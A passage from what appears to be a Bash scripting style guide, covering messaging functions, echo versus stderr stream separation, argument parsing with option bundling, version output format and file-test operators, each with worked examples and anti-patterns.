  exit "$exit_code"
}

# Yes/no prompt
yn() {
  ((PROMPT)) || return 0
  local -- reply
  >&2 read -r -n 1 -p "$SCRIPT_NAME: ${YELLOW}$1${NC} y/n " reply
  >&2 echo
  [[ ${reply,,} == y ]]
}

# ============================================================================
# Main script logic
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -d|--debug)   DEBUG=1 ;;
    -y|--yes)     PROMPT=0 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  readonly -- VERBOSE DEBUG PROMPT

  info "Starting $SCRIPT_NAME $VERSION"
  debug "Debug mode enabled"

  # Example operations
  info 'Processing files...'
  success 'Files processed'

  if yn 'Continue with deployment?'; then
    info 'Deploying...'
    success 'Deployment complete'
  else
    warn 'Deployment skipped'
  fi
}

main "$@"

#fin
\`\`\`

**Alternative: Simplified _msg without colors:**

For scripts that don't need colors:

\`\`\`bash
_msg() {
  local -- level="${FUNCNAME[1]}"
  printf '[%s] %s: %s\n' "$SCRIPT_NAME" "${level^^}" "$*"
}

info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }
die()     { local -i code=$1; shift; (($#)) && error "$@"; exit "$code"; }
\`\`\`

**Variation: Log to file:**

\`\`\`bash
LOG_FILE="/var/log/$SCRIPT_NAME.log"

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg timestamp

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    # Print to terminal with colors
    printf '%s %s\n' "$prefix" "$msg"

    # Log to file without colors (strip ANSI codes)
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] %s: %s\n' "$timestamp" "${FUNCNAME[1]^^}" "$msg" >> "$LOG_FILE"
  done
}
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - using echo directly
echo "Error: file not found"
# Problems:
# 1. Not going to stderr
# 2. No script name prefix
# 3. No color
# 4. Not respecting VERBOSE

# ✓ Correct - use messaging function
error 'File not found'

# ✗ Wrong - duplicating message logic
info() {
  echo "[$SCRIPT_NAME] INFO: $*"
}
warn() {
  echo "[$SCRIPT_NAME] WARN: $*"
}
error() {
  echo "[$SCRIPT_NAME] ERROR: $*"
}
# Lots of duplication!

# ✓ Correct - use _msg core function
_msg() {
  local -- prefix="$SCRIPT_NAME:"
  case "${FUNCNAME[1]}" in
    info)  prefix+=" INFO:" ;;
    warn)  prefix+=" WARN:" ;;
    error) prefix+=" ERROR:" ;;
  esac
  echo "$prefix $*"
}
info()  { _msg "$@"; }
warn()  { _msg "$@"; }
error() { >&2 _msg "$@"; }

# ✗ Wrong - errors to stdout
error() {
  echo "[ERROR] $*"  # Goes to stdout!
}

# ✓ Correct - errors to stderr
error() {
  >&2 _msg "$@"
}

# ✗ Wrong - ignoring VERBOSE flag
info() {
  >&2 _msg "$@"
}
# Always prints, even when VERBOSE=0!

# ✓ Correct - check VERBOSE
info() {
  ((VERBOSE)) || return 0
  >&2 _msg "$@"
}

# ✗ Wrong - die without exit code
die() {
  error "$@"
  exit 1  # Always exit 1, can't customize
}

# ✓ Correct - die with exit code parameter
die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ✗ Wrong - checking PROMPT inside yn()
yn() {
  local reply
  read -r -n 1 -p "$1 y/n " reply
  [[ ${reply,,} == y ]]
}
# Can't disable prompts for automation!

# ✓ Correct - yn() respects PROMPT flag
yn() {
  ((PROMPT)) || return 0  # Non-interactive mode
  local reply
  >&2 read -r -n 1 -p "$SCRIPT_NAME: $1 y/n " reply
  >&2 echo
  [[ ${reply,,} == y ]]
}
\`\`\`

**Function variants for different needs:**

**Minimal set (no colors, no flags):**

\`\`\`bash
info()  { >&2 echo "[$SCRIPT_NAME] $*"; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*"; }
die()   { error "$*"; exit "${1:-1}"; }
\`\`\`

**Medium set (with VERBOSE, no colors):**

\`\`\`bash
declare -i VERBOSE=0

info()  { ((VERBOSE)) && >&2 echo "[$SCRIPT_NAME] $*"; return 0; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*"; }
die()   { local -i code=$1; shift; (($#)) && error "$@"; exit "$code"; }
\`\`\`

**Full set (with colors, flags, _msg core):**

See complete example above.

**Summary:**

- **Use _msg() core function** with FUNCNAME inspection for DRY implementation
- **Conditional functions** (`info`, `warn`) respect `VERBOSE` flag
- **Unconditional functions** (`error`) always display
- **Errors to stderr**: `>&2` prefix on error/warn/info functions
- **Colors conditional** on terminal output: `[[ -t 1 && -t 2 ]]`
- **die() takes exit code** as first parameter: `die 1 'Error message'`
- **yn() respects PROMPT** flag for non-interactive mode
- **Consistent prefix**: Every message shows script name
- **Remove unused** functions in production (see Section 6)

**Key principle:** Messaging functions provide a consistent, professional user interface. The _msg() core function with FUNCNAME inspection eliminates code duplication and makes adding new message types trivial. Always separate informational output (stderr) from data output (stdout).


---


**Rule: BCS0904**

### Usage Documentation
\`\`\`bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
EOT
}
\`\`\`


---


**Rule: BCS0905**

### Echo vs Messaging Functions

**Choose between plain `echo` and messaging functions based on the context, formatting requirements, and output destination. Use messaging functions for operational status updates that respect verbosity settings, and plain `echo` for data output and structured documentation that must always display.**

**Rationale:**

- **Stream Separation**: Messaging functions go to stderr (user-facing), `echo` goes to stdout (data/parseable output)
- **Verbosity Control**: Messaging functions respect `VERBOSE` flag, `echo` always displays (critical for pipeable data)
- **Consistent Formatting**: Messaging functions provide uniform prefixes, colors, and script name identification
- **Output Purpose**: Operational messages vs data output require different handling
- **Parseability**: Plain `echo` output is predictable and parseable; messaging functions include formatting
- **Script Composition**: Using proper streams allows scripts to be combined in pipelines without mixing data and status messages

**When to use messaging functions (`info`, `success`, `warn`, `error`):**

**1. Operational status updates:**

```bash
# Script progress indicators
info 'Starting database backup...'
success 'Database backup completed'
warn 'Backup size exceeds threshold'
error 'Database connection failed'

# Processing notifications
info "Processing file $count of $total"
success "Processed $filename successfully"
```

**2. User-facing diagnostic information:**

```bash
# Diagnostic output
debug "Variable state: count=$count, total=$total"
debug 'Entering validation phase'

# Configuration feedback
info "Using configuration file: $config_file"
info "Timeout set to $timeout seconds"
```

**3. Messages that should respect verbosity:**

```bash
# Only shown if VERBOSE=1
info 'Checking prerequisites...'
info 'Loading configuration...'
success 'All checks passed'

# Always shown (errors)
error 'Configuration file not found'
die 1 'Critical dependency missing'
```

**4. Messages needing visual formatting:**

```bash
# Color-coded status
success 'Build completed'        # Green checkmark
warn 'Using default settings'    # Yellow warning
error 'Compilation failed'       # Red X
info 'Tests running...'          # Cyan info icon
```

**When to use plain `echo`:**

**1. Data output (stdout):**

```bash
# Function returns data
get_user_email() {
  local -- username="$1"
  local -- email

  email=$(grep "^$username:" /etc/passwd | cut -d: -f5)

  echo "$email"  # Data output - must use echo
}

# Caller can capture output
user_email=$(get_user_email 'alice')
```

**2. Help text and documentation:**

```bash
usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] FILE...

Process files with various options.

Options:
  -v, --verbose     Enable verbose output
  -h, --help        Show this help message
  -o, --output DIR  Output directory

Examples:
  script.sh file.txt
  script.sh -v -o /tmp file1.txt file2.txt
EOF
}
```

**3. Structured multi-line output:**

```bash
# Report generation
generate_report() {
  echo "System Report"
  echo "============="
  echo ""
  echo "Disk Usage:"
  df -h
  echo ""
  echo "Memory Usage:"
  free -h
  echo ""
  echo "Load Average:"
  uptime
}
```

**4. Output intended for parsing or piping:**

```bash
# List output for processing
list_users() {
  local -- user

  while IFS=: read -r user _; do
    echo "$user"
  done < /etc/passwd
}

# Can be piped or processed
list_users | grep '^admin' | wc -l
```

**5. Output that should always display regardless of verbosity:**

```bash
# Results that user explicitly requested
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Final summary output
echo "Processed $success_count files successfully"
echo "Failed: $fail_count files"
```

**Decision matrix:**

```bash
# Is this operational status or data?
#   Status → messaging function
#   Data   → echo

# Should this respect verbosity settings?
#   Yes → messaging function (info, warn, debug)
#   No  → echo (or error for critical messages)

# Will this be parsed or piped?
#   Yes → echo to stdout
#   No  → messaging function to stderr

# Is this multi-line formatted output?
#   Yes → echo (with here-doc or multiple statements)
#   No  → messaging function (single-line status)

# Does this need color/formatting?
#   Yes → messaging function
#   No  → echo
```

**Complete example showing both:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  YELLOW=''
  CYAN=''
  NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC

# ============================================================================
# Messaging Functions (stderr, with verbosity control)
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ============================================================================
# Data Functions (stdout, always output)
# ============================================================================

# Return user's home directory (data output)
get_user_home() {
  local -- username="$1"
  local -- home_dir

  home_dir=$(getent passwd "$username" | cut -d: -f6)

  if [[ -z "$home_dir" ]]; then
    return 1
  fi

  echo "$home_dir"  # Data to stdout
}

# Generate structured report (data output)
show_report() {
  echo "User Report"
  echo "==========="
  echo ""
  echo "Username: $USER"
  echo "Home: $HOME"
  echo "Shell: $SHELL"
  echo ""
  echo "Disk Usage:"
  df -h "$HOME" | tail -n 1
}

# ============================================================================
# Documentation Functions (stdout, always output)
# ============================================================================

usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] USERNAME

Get information about a user.

Options:
  -v, --verbose    Show detailed progress
  -h, --help       Show this help

Examples:
  script.sh alice
  script.sh -v bob
EOF
}

# ============================================================================
# Main Logic
# ============================================================================

main() {
  local -- username
  local -- user_home

  # Parse arguments (messaging functions for progress)
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -h|--help)    usage; return 0 ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            break ;;
  esac; shift; done

  readonly -- VERBOSE

  # Validate arguments (error message)
  if (($# != 1)); then
    error 'Expected exactly one argument'
    usage
    return 22
  fi

  username="$1"

  # Operational status (messaging functions to stderr)
  info "Looking up user: $username"

  # Get data (echo to stdout)
  if ! user_home=$(get_user_home "$username"); then
    error "User not found: $username"
    return 1
  fi

  # Operational status (messaging function)
  success "Found user: $username"

  # Data output (echo to stdout) - always displays
  show_report

  # Operational status (messaging function)
  info 'Report generation complete'
}

main "$@"

#fin
```

**Running the example:**

```bash
# Without verbose - only data output and errors
$ ./script.sh alice
User Report
===========

Username: alice
Home: /home/alice
Shell: /bin/bash

Disk Usage:
/dev/sda1  100G  50G  50G  50% /home

# With verbose - operational messages visible (to stderr)
$ ./script.sh -v alice
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
User Report
===========

Username: alice
Home: /home/alice
Shell: /bin/bash

Disk Usage:
/dev/sda1  100G  50G  50G  50% /home
script.sh: ◉ Report generation complete

# Pipe output (only stdout data piped, stderr messages visible)
$ ./script.sh -v alice | grep Shell
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
Shell: /bin/bash
script.sh: ◉ Report generation complete

# Redirect output (data to file, messages to terminal)
$ ./script.sh -v alice > report.txt
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
script.sh: ◉ Report generation complete

$ cat report.txt
User Report
===========
...
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using info() for data output
get_user_email() {
  local -- email="$1"
  info "$email"  # Goes to stderr! Can't be captured!
}
email=$(get_user_email 'alice')  # $email is empty!

# ✓ Correct - use echo for data output
get_user_email() {
  local -- email="$1"
  echo "$email"  # Goes to stdout, can be captured
}
email=$(get_user_email 'alice')  # $email contains value

# ✗ Wrong - using echo for operational status
process_file() {
  local -- file="$1"
  echo "Processing $file..."  # Goes to stdout - mixes with data!
  cat "$file"
}

# ✓ Correct - use messaging function for status
process_file() {
  local -- file="$1"
  info "Processing $file..."  # Goes to stderr - separated from data
  cat "$file"                  # Data to stdout
}

# ✗ Wrong - help text using info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'
  info '  -v  Verbose mode'
  info '  -h  Show help'
}
# Won't display if VERBOSE=0!

# ✓ Correct - help text using echo/cat
show_help() {
  cat <<'EOF'
Usage: script.sh [OPTIONS]
  -v  Verbose mode
  -h  Show help
EOF
}

# ✗ Wrong - mixing data and status on same stream
list_files() {
  echo "Listing files..."  # Status to stdout
  ls                       # Data to stdout
}
# Can't parse output cleanly!

# ✓ Correct - status to stderr, data to stdout
list_files() {
  info 'Listing files...'  # Status to stderr
  ls                        # Data to stdout
}

# ✗ Wrong - error messages to stdout
validate_input() {
  if [[ ! -f "$1" ]]; then
    echo "File not found: $1"  # To stdout - wrong stream!
    return 1
  fi
}

# ✓ Correct - error messages to stderr
validate_input() {
  if [[ ! -f "$1" ]]; then
    error "File not found: $1"  # To stderr - correct stream
    return 1
  fi
}

# ✗ Wrong - data output respecting VERBOSE
get_count() {
  local -i count=10
  ((VERBOSE)) && echo "$count"  # Data not shown if VERBOSE=0!
}

# ✓ Correct - data always outputs
get_count() {
  local -i count=10
  echo "$count"  # Always outputs data
}

# ✗ Wrong - multi-line help with info()
show_usage() {
  info 'Usage: script.sh [OPTIONS]'
  info ''
  info 'Options:'
  info '  -v  Verbose'
}
# Verbose-dependent, ugly formatting

# ✓ Correct - multi-line help with echo/cat
show_usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS]

Options:
  -v  Verbose
EOF
}
```

**Edge cases and borderline scenarios:**

**1. Version output:**

```bash
# Version is data output (always display)
show_version() {
  echo "$SCRIPT_NAME $VERSION"  # Use echo
}

# Not this:
show_version() {
  info "$SCRIPT_NAME $VERSION"  # Wrong - version won't show if VERBOSE=0
}
```

**2. Progress during data generation:**

```bash
# Need progress while generating data
generate_data() {
  local -i i

  # Progress to stderr
  info 'Generating data...'

  # Data to stdout
  for ((i=1; i<=100; i++)); do
    echo "line $i"
  done

  # Completion status to stderr
  success 'Data generation complete'
}

# Caller can capture data, see progress
data=$(generate_data)
```

**3. Conditional output formatting:**

```bash
# Different output for interactive vs non-interactive
show_result() {
  if [[ -t 1 ]]; then
    # Interactive terminal - use messaging functions
    success 'Operation completed'
    info "Result: $result"
  else
    # Non-interactive/piped - use plain echo
    echo "$result"
  fi
}
```

**4. Error context in functions:**

```bash
# Function can use messaging for context, return code for status
validate_config() {
  local -- config_file="$1"

  if [[ ! -f "$config_file" ]]; then
    error "Config file not found: $config_file"
    return 2
  fi

  if [[ ! -r "$config_file" ]]; then
    error "Config file not readable: $config_file"
    return 5
  fi

  # Validation passed - no output needed
  return 0
}

# Caller handles based on return code
if ! validate_config "$config"; then
  die $? 'Configuration validation failed'
fi
```

**5. Logging vs user messages:**

```bash
# Log to file (echo), message to user (messaging function)
process_item() {
  local -- item="$1"

  # Log entry (data to stdout, redirected to file)
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] Processing: $item"

  # User message (status to stderr)
  info "Processing $item..."
}

# Usage with logging
process_item "$item" >> "$log_file"
```

**Testing stream separation:**

```bash
# Test that data goes to stdout
test_data_output() {
  local -- output

  output=$(get_user_home 'alice')

  [[ -n "$output" ]] || die 1 'Expected output from get_user_home'
  info "Test passed: Data captured correctly"
}

# Test that messages don't interfere with data capture
test_message_separation() {
  local -- output

  # Capture stdout only
  output=$(
    info 'Starting process...'  # To stderr - not captured
    echo 'data'                  # To stdout - captured
    success 'Process complete'   # To stderr - not captured
  )

  [[ "$output" == 'data' ]] || die 1 "Expected 'data', got '$output'"
  info 'Test passed: Messages separate from data'
}
```

**Summary:**

- **Use messaging functions** for operational status, diagnostics, and user-facing messages
- **Use plain `echo`** for data output, help text, structured reports, and parseable output
- **Stream separation**: Messaging to stderr (user-facing), echo to stdout (data/parseable)
- **Verbosity**: Messaging functions respect `VERBOSE`, echo always displays
- **Pipeability**: Only stdout (echo) should contain data for piping/capturing
- **Multi-line output**: Use echo with here-docs, not multiple messaging function calls
- **Error messages**: Always to stderr (use `error()` or `>&2 echo`)
- **Help/version**: Always display (echo), never verbose-dependent

**Key principle:** The choice between echo and messaging functions is fundamentally about stream separation. Operational messages (how the script is working) belong on stderr via messaging functions. Data output (what the script produces) belongs on stdout via echo. This separation enables proper script composition, piping, and redirection while keeping users informed of progress.


---


**Rule: BCS1001**

### Standard Argument Parsing Pattern

**Complete pattern with short option support:**

\`\`\`bash
while (($#)); do case $1 in
  -a|--add)       noarg "$@"; shift
                  process_argument "$1" ;;
  -m|--depth)     noarg "$@"; shift
                  max_depth="$1" ;;
  -L|--follow-symbolic)
                  symbolic='-L' ;;

  -p|--prompt)    PROMPT=1; VERBOSE=1 ;;
  -v|--verbose)   VERBOSE+=1 ;;

  -q|--quiet)     VERBOSE=0 ;;
  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;

  -h|--help)      show_help; exit 0 ;;
  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option '$1'" ;;
  *)              Paths+=("$1") ;;
esac; shift; done
\`\`\`

**Pattern breakdown and rationale:**

**1. Loop structure: `while (($#)); do ... done`**
- `(($#))` - Arithmetic test, true while arguments remain
- More efficient than `while [[ $# -gt 0 ]]`
- Exits when no arguments left

**2. Case statement: `case $1 in ... esac`**
- Matches current argument (`$1`) against patterns
- Supports multiple patterns per branch: `-a|--add`
- More readable than nested if/elif chains

**3. Options with arguments:**
\`\`\`bash
-m|--depth)     noarg "$@"; shift
                max_depth="$1" ;;
\`\`\`
- `noarg "$@"` - Validates argument exists (prevents "missing argument" errors)
- `shift` - Moves to next argument (the value)
- `max_depth="$1"` - Captures the value
- Second `shift` at end of loop moves past the value

**4. Options without arguments (flags):**
\`\`\`bash
-p|--prompt)    PROMPT=1; VERBOSE=1 ;;
-v|--verbose)   VERBOSE+=1 ;;
\`\`\`
- Just set variables, no shift needed (handled at loop end)
- Can set multiple variables per option
- `VERBOSE+=1` allows stacking: `-vvv` = `VERBOSE=3`

**5. Options that exit immediately:**
\`\`\`bash
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
-h|--help)      show_help; exit 0 ;;
\`\`\`
- Print information and exit
- No shift needed (script exits)
- Use `exit 0` (success exit code)

**6. Short option bundling:**
\`\`\`bash
-[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
              set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
\`\`\`
- **Purpose**: Allows `-vpL` instead of `-v -p -L`
- **Pattern**: `-[amLpvqVh]*` matches any short option combination
- **Mechanism**: Splits bundled options into separate arguments
- **Example**: `-vpL file` becomes `-v -p -L file`
- **How it works:**
  1. `${1:1}` - Remove leading dash (e.g., `-vpL` → `vpL`)
  2. `grep -o .` - Split into individual characters
  3. `printf -- "-%c "` - Add dash before each character
  4. `set --` - Replace argument list with expanded options

**7. Invalid option handling:**
\`\`\`bash
-*)             die 22 "Invalid option '$1'" ;;
\`\`\`
- Catches any unrecognized option starting with `-`
- Uses exit code 22 (EINVAL - invalid argument)
- Shows which option was invalid

**8. Positional arguments:**
\`\`\`bash
*)              Paths+=("$1") ;;
\`\`\`
- Default case: Not an option, must be positional argument
- Append to array for later processing
- Allows unlimited positional arguments

**9. Mandatory shift at end:**
\`\`\`bash
esac; shift; done
\`\`\`
- `shift` after every iteration moves to next argument
- Critical: Without this, infinite loop!
- Placed after `esac` to handle all branches uniformly

**The `noarg` helper function:**

\`\`\`bash
noarg() {
  (($# > 1)) || die 2 "Option '$1' requires an argument"
}
\`\`\`

- **Purpose**: Validates that option requiring an argument has one
- **Check**: `(($# > 1))` - At least 2 args (option + value)
- **Usage**: Always call before shifting to capture argument value
- **Example**: `./script -m` (missing value) → "Option '-m' requires an argument"

**Complete example with all features:**

\`\`\`bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

# ============================================================================
# Utility Functions
# ============================================================================

error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*"
}

die() {
  local -i exit_code=$1
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

noarg() {
  (($# > 1)) || die 2 "Option '$1' requires an argument"
}

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE...

Process files with various options.

Options:
  -o, --output FILE  Output file (required)
  -v, --verbose      Verbose output
  -n, --dry-run      Dry-run mode
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -o output.txt file1.txt file2.txt
  $SCRIPT_NAME -v -n -o result.txt *.txt
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift
                    output_file=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support
    -[ovnVh]*)    #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  # Validate required arguments
  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  # Use parsed arguments
  ((VERBOSE)) && echo "Processing ${#files[@]} files"
  ((DRY_RUN)) && echo '[DRY RUN] Would write to:' "$output_file"

  # Process files (example logic)
  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE)) && echo "Processing: $file"
    # Processing logic here
  done

  ((VERBOSE)) && echo "Would write results to: $output_file"
}

main "$@"

#fin
\`\`\`

**Short option bundling examples:**

\`\`\`bash
# These are equivalent:
./script -v -n -o output.txt file.txt
./script -vno output.txt file.txt

# These are equivalent:
./script -v -v -v file.txt
./script -vvv file.txt

# Mixed long and short:
./script --verbose -no output.txt --dry-run file.txt
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - using while [[ ]] instead of (())
while [[ $# -gt 0 ]]; do  # Verbose, less efficient

# ✓ Correct
while (($#)); do

# ✗ Wrong - not calling noarg before shift
-o|--output)    shift
                output_file=$1 ;;  # Fails if no argument!

# ✓ Correct
-o|--output)    noarg "$@"; shift
                output_file=$1 ;;

# ✗ Wrong - forgetting shift at loop end
while (($#)); do case $1 in
  ...
esac; done  # Infinite loop!

# ✓ Correct
while (($#)); do case $1 in
  ...
esac; shift; done

# ✗ Wrong - using if/elif chains instead of case
if [[ "$1" == '-v' ]] || [[ "$1" == '--verbose' ]]; then
  VERBOSE+=1
elif [[ "$1" == '-h' ]] || [[ "$1" == '--help' ]]; then
  show_help
  ...
fi

# ✓ Correct - use case statement
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -h|--help)    show_help; exit 0 ;;
  ...
esac
\`\`\`

**Rationale for this pattern:**

1. **Consistent**: Same structure works for all scripts
2. **Flexible**: Handles options with/without arguments, bundled shorts
3. **Safe**: Validates arguments exist before using them
4. **Readable**: Case statement is more scannable than if/elif chains
5. **Efficient**: Arithmetic test `(($#))` faster than `[[ ]]`
6. **Standard**: Follows Unix conventions (short/long options, bundling)


---


**Rule: BCS1002**

### Version Output Format

**Standard format:** \`<script_name> <version_number>\`

The \`--version\` option should output the script name followed by a space and the version number. Do **not** include the word "version" between them.

\`\`\`bash
# ✓ Correct
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
# Output: myscript 1.2.3

# ✗ Wrong - do not include the word "version"
-V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
# Output: myscript version 1.2.3  (incorrect)
\`\`\`

**Rationale:** This format follows GNU standards and is consistent with most Unix/Linux utilities (e.g., \`bash --version\` outputs "GNU bash, version 5.2.15", not "GNU bash version version 5.2.15").


---


**Rule: BCS1003**

### Argument Validation
\`\`\`bash
noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"; }
\`\`\`


---


**Rule: BCS1004**

### Argument Parsing Location

**Recommendation:** Place argument parsing inside the \`main()\` function rather than at the top level.

**Benefits:**
- Better testability (can test \`main()\` with different arguments)
- Cleaner variable scoping (parsing vars are local to \`main()\`)
- Encapsulation (argument handling is part of main execution flow)
- Easier to mock/test in unit tests

\`\`\`bash
# Recommended: Parsing inside main()
main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
      --prefix)     shift
                    PREFIX="$1"
                    # Update derived paths
                    BIN_DIR="$PREFIX"/bin
                    LOADABLE_DIR="$PREFIX"/lib/bash/loadables
                    ;;
      -h|--help)    show_help
                    exit 0
                    ;;
      -*)           die 22 "Invalid option '$1'"
                    ;;
      *)            >&2 show_help
                    die 2 "Unknown option '$1'"
                    ;;
    esac
    shift
  done

  # Proceed with main logic
  check_prerequisites
  build_components
  install_components
}

main "$@"
#fin
\`\`\`

**Alternative:** For very simple scripts (< 40 lines) without a \`main()\` function, top-level parsing is acceptable:

\`\`\`bash
#!/bin/bash
set -euo pipefail

# Simple scripts can parse at top level
while (($#)); do case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option '$1'" ;;
  *)            FILES+=("$1") ;;
esac; shift; done

# Rest of simple script logic
\`\`\`


---


**Rule: BCS1101**

### Safe File Testing

**Always quote variables and use `[[ ]]` for file tests:**

\`\`\`bash
# Basic file testing
[[ -f "$file" ]] && source "$file"
[[ -d "$path" ]] || die 1 "Not a directory: $path"
[[ -r "$file" ]] || warn "Cannot read: $file"
[[ -x "$script" ]] || die 1 "Not executable: $script"

# Check multiple conditions
if [[ -f "$config" && -r "$config" ]]; then
  source "$config"
else
  die 3 "Config file not found or not readable: $config"
fi

# Check file emptiness
[[ -s "$logfile" ]] || warn 'Log file is empty'

# Compare file timestamps
if [[ "$source" -nt "$destination" ]]; then
  cp "$source" "$destination"
  info "Updated $destination"
fi
\`\`\`

**Complete file test operators:**

| Operator | Returns True If |
|----------|----------------|
| `-e file` | File exists (any type) |
| `-f file` | Regular file exists |
| `-d dir` | Directory exists |
| `-L link` | Symbolic link exists |
| `-p pipe` | Named pipe (FIFO) exists |
| `-S sock` | Socket exists |
| `-b file` | Block device exists |
| `-c file` | Character device exists |

**Permission and attribute tests:**

| Operator | Returns True If |
|----------|----------------|
| `-r file` | File is readable |
| `-w file` | File is writable |
| `-x file` | File is executable |
| `-s file` | File is not empty (size > 0) |
| `-u file` | File has SUID bit set |
| `-g file` | File has SGID bit set |
| `-k file` | File has sticky bit set |
| `-O file` | You own the file |
| `-G file` | File's group matches yours |
| `-N file` | File modified since last read |

**File comparison operators:**

| Operator | Returns True If |
|----------|----------------|
| `file1 -nt file2` | file1 is newer than file2 (modification time) |
| `file1 -ot file2` | file1 is older than file2 |
| `file1 -ef file2` | file1 and file2 have same device and inode (same file) |

**Rationale:**

- **Always quote**: `"$file"` prevents word splitting and glob expansion
- **Use `[[ ]]`**: More robust than `[ ]` or `test` command
- **Test before use**: Prevents errors from missing/unreadable files
- **Fail fast**: Use `|| die` to exit immediately if prerequisites not met
- **Informative messages**: Include filename in error messages for debugging

